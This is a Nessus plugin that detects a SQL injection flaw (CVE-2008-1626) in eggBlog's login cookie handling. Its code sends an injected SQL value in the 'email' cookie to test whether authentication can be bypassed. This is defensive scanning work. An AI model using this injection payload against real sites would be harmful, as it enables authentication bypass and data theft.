#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31720);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2008-1626");
  script_bugtraq_id(28497);
  script_osvdb_id(43787);
  script_xref(name:"EDB-ID", value:"5336");
  script_xref(name:"Secunia", value:"29583");

  script_name(english:"eggBlog _lib/user.php eb_login Function Cookie Handling SQL Injection");
  script_summary(english:"Tries to bypass the login check");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to a SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running eggBlog, a free PHP and MySQL blog software
package. 

The version of eggBlog installed on the remote host fails to sanitize
input to the 'email' and 'password' cookies before using it in the
'eb_login' function in '_lib/user.php' to perform database queries. 
Provided PHP's 'magic_quotes_gpc' setting is disabled, an attacker may
be able to leverage this issue to manipulate database queries to
disclose sensitive information, bypass authentication, modify data, or
even attack the underlying database." );
 # http://web.archive.org/web/20120305202911/http://eggblog.net/news.php?id=39
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1729ab5d" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to eggBlog 4.0.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20,89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/04/01");
 script_cvs_date("$Date: 2017/05/16 19:35:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/eggblog", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  init_cookiejar();
  set_http_cookie(name: 'password', value: 'nessus');
  set_http_cookie(name: 'email', value: SCRIPT_NAME+'" UNION SELECT 1--');
  r = http_send_recv3(method: 'GET', item: string(dir, "/index.php"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if the app sets cookies in eb_login().
  if (
    # the app thinks we're logged in and...
    '<li><a href="mydetails.php">' >< r[2] &&
    # it's eggBlog and...
    '">powered by eggBlog.net<' >< r[2] &&
    # cookies were set in eb_login()
    egrep(pattern:'^Set-Cookie: .*password=nessus', string:r[1])
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
